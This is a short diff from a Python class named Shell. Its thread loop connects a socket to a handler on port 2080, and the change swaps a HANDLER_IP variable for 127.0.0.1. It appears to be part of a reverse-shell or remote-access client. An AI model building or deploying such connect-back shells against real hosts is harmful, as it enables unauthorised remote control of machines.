@@ -169,7 +169,7 @@ class Shell:
 		current_thread = threading.currentThread()
 		while not current_thread.stopped():
 			local_socket = socket.socket()
-			local_socket.connect((HANDLER_IP,2080))
+			local_socket.connect(("127.0.0.1",2080))
 			
 			while not current_thread.stopped():
 				try:
